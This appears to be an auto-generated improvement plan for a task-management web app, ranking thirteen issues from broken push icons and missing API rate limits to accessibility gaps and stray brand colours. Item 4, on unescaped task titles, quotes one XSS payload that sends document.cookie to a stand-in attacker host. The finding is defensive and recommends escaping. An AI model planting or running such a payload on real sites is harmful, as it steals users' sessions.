# Improvement Plan — Arete / Task OS

_Generated: 2026-07-25_

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. Push notification icons are 404-ing on every device
- **What**: Service worker references `./icons/icon-192.png` for push notification icon and badge, but no `icons/` subdirectory exists — images live at the repo root.
- **Where**: `sw.js:46-47`
- **Why it matters**: Every push notification sent to users arrives with a broken icon, degrading trust and making the reminders feature look broken. Silent failure — no error thrown.
- **Effort**: S
- **Suggested fix**:
  - Change `icon:'./icons/icon-192.png'` → `icon:'./icon-192.png'`
  - Change `badge:'./icons/icon-192.png'` → `badge:'./icon-192.png'`

---

### 2. AI proxy has no rate limiting — one account can drain the Anthropic budget
- **What**: The Claude proxy in `api/claude.js` forwards all authenticated requests to Anthropic without any per-user or per-day quota. The code itself flags this with a comment.
- **Where**: `api/claude.js:12-14` (the comment), full handler
- **Why it matters**: A single abusive or compromised account can run up an unlimited Anthropic bill in minutes. There is no circuit-breaker.
- **Effort**: M
- **Suggested fix**:
  - Add a simple in-memory or Upstash Redis counter keyed to `_SB.uid` with a daily cap (e.g. 50 requests/day)
  - Return HTTP 429 with a `Retry-After` header when the cap is hit
  - Log overages to a Vercel KV or an alerting endpoint so spikes are visible

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 3. Analytics are implemented but the key is blank — zero funnel visibility
- **What**: PostHog is wired up in both `landing.html` and `index.html`, but both `POSTHOG_KEY` and `APP_CONFIG.posthogKey` are empty strings. No events are firing.
- **Where**: `landing.html:702` (`var POSTHOG_KEY = ''`), `index.html:9960` (`posthogKey: ''`)
- **Why it matters**: The landing→signup funnel is invisible. Commit #83 specifically added scroll-depth, CTA-click, and landing_view tracking, but none of it is recording. You cannot measure what's working on the growth surface.
- **Effort**: S
- **Suggested fix**:
  - Paste the PostHog project key into both locations (same key — same origin means the funnel connects automatically)
  - Verify `landing_view`, `landing_cta_click`, and `guest_started` events appear in PostHog after one test visit

---

### 4. Task and goal titles are rendered unescaped via innerHTML in Weekly Review
- **What**: Three panels in `renderWizPanel()` inject `t.title` and `g.title` directly into `innerHTML` without calling `esc()`. A task named `<img src=x onerror="fetch('https://evil.com?d='+document.cookie)">` would execute.
- **Where**: `index.html:3594` (Completed this week), `index.html:3601` (Backlog promotion), `index.html:3603` (Goal progress)
- **Why it matters**: Self-XSS within the user's own session is low severity in isolation. However, if a template import, a shared progress card, or a future collaboration feature allows another user to write task titles, this becomes cross-user XSS. Fix it before adding any shared-data feature.
- **Effort**: S
- **Suggested fix**:
  - Replace `${t.title}` → `${esc(t.title)}` in all three innerHTML templates
  - Audit `inboxHTML()`, `taskHTML()`, and similar renderers for the same pattern — `esc()` is already defined at line 11776

---

### 5. Hardcoded production URL in structured data and sitemap breaks SEO for any domain change
- **What**: `task-management-beige-eight.vercel.app` is hardcoded in the JSON-LD structured data block and in `sitemap.xml`. If the domain changes (e.g. to `arete.so`), Google continues indexing the old URLs.
- **Where**: `landing.html:25` (JSON-LD `"url"`), `sitemap.xml:4` (`<loc>`)
- **Why it matters**: Google's canonical discovery depends on these being correct. A domain move without updating them splits PageRank between two origins and hurts organic discovery right when the rebrand momentum matters most.
- **Effort**: S
- **Suggested fix**:
  - Define a single `BASE_URL` constant in `landing.html` or use a Vercel build-time env var
  - Update both `sitemap.xml` and the JSON-LD `url` field to use it
  - Add `<link rel="canonical" href="...">` to `landing.html` if not already present

---

### 6. `#ec4899` ("creative" bucket) is an off-palette pink — violates brand rules
- **What**: The Bucket List "Creative" category uses `#ec4899` (Tailwind pink-500), which is outside the defined brand palette and not one of the approved pinks (#C2185B, #E353B6).
- **Where**: `index.html:12193` (`BL_CATS` color map)
- **Why it matters**: Visual inconsistency in a premium-feeling app erodes the "calm, considered" brand positioning. More important: if this chip ever appears on a purple background, it violates the no-pink-on-purple rule.
- **Effort**: S
- **Suggested fix**:
  - Replace `color:'#ec4899'` with `color:'#E353B6'` (the vivid on-brand pink)
  - Do a global grep for `#ec4899`, `#a855f7`, `#8b5cf6` to catch any other stray Tailwind color remnants

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 7. `index.html` is 14,924 lines — a single file is becoming a merge hazard
- **What**: The entire app — HTML, 3000+ lines of CSS, and 10,000+ lines of JS — lives in one file. Every PR touches it; diffs are unreadable and conflicts are inevitable.
- **Where**: `index.html` (entire file)
- **Why it matters**: Refactoring a feature requires scrolling through 14k lines. Git blame is useless. Onboarding a contributor means explaining a 14k-line file. Velocity will slow quadratically as the file grows.
- **Effort**: L
- **Suggested fix**:
  - Start with the lowest-risk extraction: pull all `<style>` into `app.css`
  - Then extract clearly bounded JS modules (e.g. `supabase.js`, `ai.js`, `seed.js`) linked via `<script type="module">`
  - Don't try to do it all at once — one module per sprint

---

### 8. ~735 interactive `onclick` elements but only ~89 aria-label/role/tabindex attributes — app is screen-reader dark
- **What**: A grep shows ~735 `onclick="..."` attributes vs ~89 `aria-label`/`role`/`tabindex` attributes across the entire app. Nav items, task cards, action buttons, and modals are functionally invisible to screen readers and keyboard-only users.
- **Where**: `index.html` throughout — nav items (`index.html:999-1057`), task action sheet (`index.html:~9530`), modal close buttons
- **Why it matters**: Accessibility gaps are a legal risk in some markets, a conversion barrier for ~15% of users who rely on assistive tech, and a sign of UX incompleteness in a "premium" product.
- **Effort**: M
- **Suggested fix**:
  - Audit the five most-used interactive surfaces: nav sidebar, task cards, the `⌘K` command palette, the process-inbox flow, and modals
  - Add `role="button"`, `tabindex="0"`, and `aria-label` to all `<div onclick>` elements that act as buttons
  - Consider using `<button>` elements instead of `<div onclick>` for new components going forward

---

### 9. Token refresh silently catches all errors, masking auth breakage
- **What**: `sbSyncNow()` wraps the entire sync in `try/catch(e)` and only calls `_sbSetStatus('⚠ '+e.message)` — but if `_sbToken()` silently fails (network offline, token revoked), the error message may never surface in a user-visible place.
- **Where**: `index.html:10412-10445` (`sbSyncNow`), `index.html:10023-10027` (`_sbToken`)
- **Why it matters**: Users on mobile with spotty connectivity can lose data silently. The sync pill shows "⚠ …" but there's no retry logic, no toast, and no banner for persistent auth failure after token expiry.
- **Effort**: M
- **Suggested fix**:
  - Add an explicit `instanceof` check for auth-specific errors in `_sbToken` and show a persistent toast ("Session expired — please reconnect") with a direct link to settings
  - Add exponential-backoff retry logic (max 3 attempts) before marking sync as failed

---

### 10. `api/claude.js` model ID is hardcoded — needs a manual edit to upgrade
- **What**: `claude-haiku-4-5-20251001` is hardcoded at line 42. When a new faster/cheaper Haiku ships, there's no way to update it without a code deploy.
- **Where**: `api/claude.js:42`
- **Why it matters**: Low urgency now, but model upgrades (better reasoning, lower cost) become a deploy instead of a config change.
- **Effort**: S
- **Suggested fix**:
  - Add `CLAUDE_MODEL` to the Vercel env vars (default: `claude-haiku-4-5-20251001`)
  - Reference it as `process.env.CLAUDE_MODEL || 'claude-haiku-4-5-20251001'`

---

## 💡 P3 — Nice to have

### 11. `seed()` personal data (Greek medical tasks, personal finances) is confusing for open-source contributors
- **What**: The `seed()` function at `index.html:4532` contains hundreds of the developer's personal tasks (Greek-language medical appointments, personal finance goals, Givelink-specific business tasks). It only runs in non-hosted (local) mode, so it doesn't affect hosted users.
- **Where**: `index.html:4532-4926`
- **Why it matters**: Anyone forking or self-hosting the app for development gets an inbox full of personal tasks in Greek, with real medical info and personal financial goals. Privacy risk for the developer; confusing for contributors.
- **Effort**: S
- **Suggested fix**:
  - Replace `seed()` and `seedGoals()` with the same neutral `_seedStarter()` data used for hosted new users
  - Move any data needed for personal dev testing into a git-ignored local config file

---

### 12. `givelink.html` still uses the old domain and may be out of brand sync
- **What**: `givelink.html` is a separate marketing page (1,755 lines) that was excluded from recent brand consistency work. It has not been touched since the Givelink/Task OS separation in commit #73.
- **Where**: `givelink.html` (entire file)
- **Why it matters**: If potential nonprofit partners land on `/givelink` and see a mismatched brand, it undermines trust in both Arete and Givelink.
- **Effort**: S
- **Suggested fix**:
  - Do a quick brand audit: check colors against palette, verify CTAs still point to the right URLs, confirm the copy reflects the current product positioning

---

### 13. Readwise and Notion integrations are in CSP allow-list but the integration status is unclear
- **What**: `vercel.json` allows `connect-src` to `readwise.io` and `api.notion.com`, but there are no obvious in-app flows that consume Readwise highlights or write to Notion (only settings fields to store the tokens).
- **Where**: `vercel.json` CSP, `index.html:2042-2044` (settings fields)
- **Why it matters**: Incomplete integrations confuse users who configure them and see nothing happen. They also add attack surface to the CSP with no current benefit.
- **Effort**: M
- **Suggested fix**:
  - Either implement the Readwise highlights import and Notion weekly-notes sync as working features with visible UI
  - Or remove the settings fields and the CSP entries until the integrations are ready

---

_Total: 13 items across 4 tiers. Top priority this sprint: items 1 (push icon), 2 (rate limiting), and 3 (analytics key)._
